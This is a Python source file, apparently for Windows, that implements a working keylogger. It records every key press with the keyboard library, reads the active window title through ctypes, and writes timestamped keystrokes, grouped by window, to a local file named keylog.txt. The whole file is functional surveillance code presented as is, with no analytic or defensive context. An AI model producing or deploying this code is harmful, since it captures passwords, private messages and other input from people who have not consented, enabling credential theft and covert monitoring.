import time
import keyboard
import ctypes

def get_active_window_title():
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
    buffer = ctypes.create_unicode_buffer(length + 1)
    ctypes.windll.user32.GetWindowTextW(hwnd, buffer, length + 1)
    return buffer.value

def is_ignored_key(key):
    ignored_keys = ["shift", "ctrl", "alt", "alt gr", "right ctrl", "caps lock", "right shift"]
    return key.lower() in ignored_keys

def keylogger():
    with open("keylog.txt", "w", encoding="utf-8") as keylog:
        current_line = ""
        last_active_window = get_active_window_title()

        while True:
            try:
                pressed_key = keyboard.read_event()

                if pressed_key.event_type == "down":
                    key = pressed_key.name

                    if is_ignored_key(key):
                        continue  # İstenmeyen tuşları kaydetme, döngünün başına geri dön

                    if len(key) > 1:
                        if key == "space":
                            key = " "
                        elif key == "enter":
                            key = "\n"
                        elif key == "tab":
                            key = "\t"
                    else:
                        if pressed_key.name.isupper():
                            key = pressed_key.name
                        else:
                            key = pressed_key.name.lower()

                    current_active_window = get_active_window_title()
                    if current_active_window != last_active_window:
                        keylog.write("{}\t{}\t{}\n".format(time.strftime("%Y-%m-%d %H:%M:%S"), last_active_window, current_line))
                        keylog.flush()
                        current_line = ""
                        last_active_window = current_active_window

                    if key == "\n" or key == "\t":
                        keylog.write("{}\t{}\t{}\n".format(time.strftime("%Y-%m-%d %H:%M:%S"), current_active_window, current_line))
                        keylog.flush()
                        current_line = ""
                        if key == "\n":
                            keylog.write("\n")
                    else:
                        current_line += key

            except KeyboardInterrupt:
                break

if __name__ == "__main__":
    keylogger()
